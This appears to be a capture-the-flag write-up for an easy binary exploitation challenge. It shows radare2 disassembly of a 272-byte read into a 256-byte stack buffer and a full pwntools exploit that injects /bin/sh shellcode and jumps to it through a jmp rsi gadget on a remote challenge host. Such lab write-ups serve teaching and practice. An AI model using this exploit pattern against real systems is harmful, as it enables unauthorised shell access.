# Regularity (<font color=green> Very Easy </font>)


## Description
Nothing much changes from day to day. Famine, conflict, hatred - it's all part and parcel of the lives we live now. We've grown used to the animosity that we experience every day, and that's why it's so nice to have a useful program that asks how I'm doing. It's not the most talkative, though, but it's the highest level of tech most of us will ever see...


## Tools Used

- GDB – for debugging and analyzing memory/registers during crashes.

- pwntools – for automating the exploit development and interacting with the binary.

- radare2 – for disassembly and static analysis of the binary.

- ROPgadget – to search for useful instruction sequences (gadgets) inside the binary.

## Skills Learned

- Identifying and exploiting stack buffer overflows

- Writing and injecting custom shellcode

## Steps Taken
### Step 1. Binary Reconnaissance
- `file regularity`: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
- `checksec --file=regularity`: No RELRO, No canary found, NX disabled, No PIE  
    No modern mitigations are enabled. Exploitation is straightforward.
### Step 2: Disassembly & Vulnerability Discovery
- Using radare2: `r2 -A regularity`, we can find 3 functions using `afl`:
    ```
    0x00401000    1     67 entry0
    0x00401043    1      8 loc.write
    0x0040104b    1     36 loc.read
    ```
- The one we are interested in is loc.read as it reads our input and can be vulnerable to buffer overflow. Using `pdf @loc.read`, we can disassemble the function.
    ```
    ┌ 36: loc.read ();
    │           0x0040104b      4881ec0001..   sub rsp, 0x100
    │           0x00401052      b800000000     mov eax, 0
    │           0x00401057      bf00000000     mov edi, 0
    │           0x0040105c      488d3424       lea rsi, [rsp]
    │           0x00401060      ba10010000     mov edx, 0x110              ; 272
    │           0x00401065      0f05           syscall
    │           0x00401067      4881c40001..   add rsp, 0x100
    └           0x0040106e      c3             ret
    ```
    - `sub rsp, 0x100`: allocate 256 bytes
    - `lea rsi, [rsp]`: buffer = rsp
    - `mov edx, 0x110`: read 272 bytes
- Reads 272 bytes into a 256-byte buffer on the stack → classic stack buffer overflow.
### Step 3: Find a jmp rsi Gadget
- We want the program to jump to our shellcode. The input buffer will be pointed to by rsi, so we look for `jmp rsi` gadget using ROPgadget.
### Step 4: Build the [Exploit](exploit.py) Payload
- We inject shellcode that spawns a shell (/bin/sh), pad to 256 bytes, then overwrite RIP with the gadget address. 
    ```python
    from pwn import *

    context.binary = './regularity'
    context.arch = 'amd64'

    p = remote('83.136.253.201', 51755)
    shellcode = asm(shellcraft.sh())
    payload = shellcode
    payload += b'A' * (256 - len(shellcode))
    payload += p64(0x401041)  # jmp rsi

    p.sendafter(b"days?\n", payload)
    p.interactive()
### Step 5: Capture the Flag
- Once shell access is gained: `$ cat flag.txt`
